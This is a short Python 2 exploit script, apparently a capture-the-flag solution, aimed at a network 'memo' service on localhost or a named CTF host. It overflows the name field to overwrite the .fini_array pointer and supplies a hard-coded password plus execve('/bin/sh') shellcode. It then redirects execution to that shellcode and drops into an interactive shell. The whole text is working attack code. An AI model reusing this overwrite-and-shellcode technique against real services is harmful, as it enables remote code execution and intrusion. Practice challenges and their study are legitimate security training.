import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def main():
    fini_addr = 0x080499d8 # .fini_array  
    sc = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    password = "D0_u_3nj0y_pwn_m3??" + "\x00"

    buf = "A"*32
    buf += p(0x0804c000) # heap
    buf += p(fini_addr)

    read_until(f, "(name)")
    f.write(buf+"\n")

    read_until(f, "(pass)")
    f.write(password+sc+"\n")

    read_until(f, "(memo)")
    f.write(p(0x0804c000+len(password))+"\n")

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("memo.ctfq.maguro.run", 10001)
        main()
    else:
        s, f = sock("localhost", 10001)
        main()
